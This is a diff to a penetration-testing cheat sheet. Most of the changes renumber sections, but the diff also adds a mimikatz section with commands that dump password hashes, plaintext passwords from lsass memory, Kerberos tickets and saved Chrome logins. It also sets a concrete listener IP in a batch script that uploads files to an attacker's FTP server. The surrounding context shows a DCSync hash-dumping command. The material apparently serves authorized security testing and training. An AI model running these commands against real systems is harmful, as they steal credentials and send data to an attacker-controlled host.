@@ -60,7 +60,7 @@ Other great cheetsheets:
     - [4.4.12. OpenSSL Encrypted Reverse Shell](#4412-openssl-encrypted-reverse-shell)
   - [4.5. Encryption](#45-encryption)
     - [4.5.1. Create self-signed SSL/TLS certificate](#451-create-self-signed-ssltls-certificate)
-    - [Decrypting files with GPG](#decrypting-files-with-gpg)
+    - [4.5.2. Decrypting files with GPG](#452-decrypting-files-with-gpg)
   - [4.6. Post Exploit Frameworks](#46-post-exploit-frameworks)
     - [4.6.1. Merlin Framework](#461-merlin-framework)
 - [5. Windows Privilege Escalation](#5-windows-privilege-escalation)
@@ -107,7 +107,8 @@ Other great cheetsheets:
     - [7.3.4. Getting Saved Wifi Passwords on Windows](#734-getting-saved-wifi-passwords-on-windows)
     - [7.3.5. Dumping Hashes from Windows](#735-dumping-hashes-from-windows)
       - [7.3.5.1. Dumping Hashes from Windows Domain Controller](#7351-dumping-hashes-from-windows-domain-controller)
-    - [7.3.6. Pass The Hash Attacks on Windows](#736-pass-the-hash-attacks-on-windows)
+    - [7.3.6. Using mimikatz to dump hashes and passwords](#736-using-mimikatz-to-dump-hashes-and-passwords)
+    - [7.3.7. Pass The Hash Attacks on Windows](#737-pass-the-hash-attacks-on-windows)
   - [7.4. Linux Files of Interest](#74-linux-files-of-interest)
   - [7.5. Data Wrangling on Linux](#75-data-wrangling-on-linux)
     - [7.5.1. Awk & Sed](#751-awk--sed)
@@ -973,7 +974,7 @@ openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out client.pem
 openssl pkcs12 -export -in client.pem -inkey ca.key -out client.p12
 ```
 
-### Decrypting files with GPG
+### 4.5.2. Decrypting files with GPG
 
 ```sh
 # import public and private keys into gpg
@@ -1982,7 +1983,7 @@ Then on Windows box, create `ftpup.bat`:
 ```bat
 @echo off
 :: change server IP and Port as required
-echo open LISTEN_IP 2121> ftpcmd.dat
+echo open 192.168.119.144 2121> ftpcmd.dat
 echo user hacker>> ftpcmd.dat
 echo g0tPwned>> ftpcmd.dat
 echo bin>> ftpcmd.dat
@@ -2189,7 +2190,33 @@ DCSync Attack
 impacket-secretsdump DOMAIN/username:Password@DC_IP_or_FQDN -just-dc-ntlm | tee dc-hashes.txt
 ```
 
-### 7.3.6. Pass The Hash Attacks on Windows
+### 7.3.6. Using mimikatz to dump hashes and passwords
+
+[PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
+
+```bat
+.\mimikatz.exe
+:: enable full debug privileges to have access to system memory
+privilege::debug
+:: get hashes and try to print plaintext passwords
+sekurlsa::logonpasswords
+:: tries to extract plaintext passwords from lsass memory
+sekurlsa::wdigest
+:: dump hashes from SAM
+lsadump::sam
+:: list all available kerberos tickets
+sekurlsa::tickets
+:: Get just the krbtgt kerberos tikcket
+sekurlsa::krbtgt
+:: List Current User's kerberos tickets
+kerberos::list
+
+:: get google chrome saved credentials
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+### 7.3.7. Pass The Hash Attacks on Windows
 
 Note: Windows hashes are in the form LMHASH:NTHASH. That convention is used here.
 
